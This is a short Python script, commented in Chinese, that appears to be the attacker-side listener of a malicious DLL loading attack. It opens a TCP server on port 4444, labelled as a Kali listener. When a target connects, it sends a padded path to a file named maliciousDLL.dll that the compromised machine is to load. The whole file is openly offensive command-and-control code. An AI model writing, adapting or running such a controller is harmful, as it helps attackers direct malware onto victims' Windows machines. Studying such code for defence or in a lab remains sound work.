import socket

# Kali监听
HOST = "0.0.0.0"
PORT = 4444

dll_path = r"C:\Users\86151\Desktop\maliciousDLL\x64\Release\maliciousDLL.dll"  # 目标机加载的恶意DLL路径

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")

    conn, addr = s.accept()
    with conn:
        print(f"[+] Connection from {addr}")
        # 发送DLL路径，注意字符串需要编码且固定长度传输
        data = dll_path.encode('utf-8')
        data += b'\x00' * (260 - len(data))  # 填充到260字节
        conn.sendall(data)
        print("[+] DLL path sent.")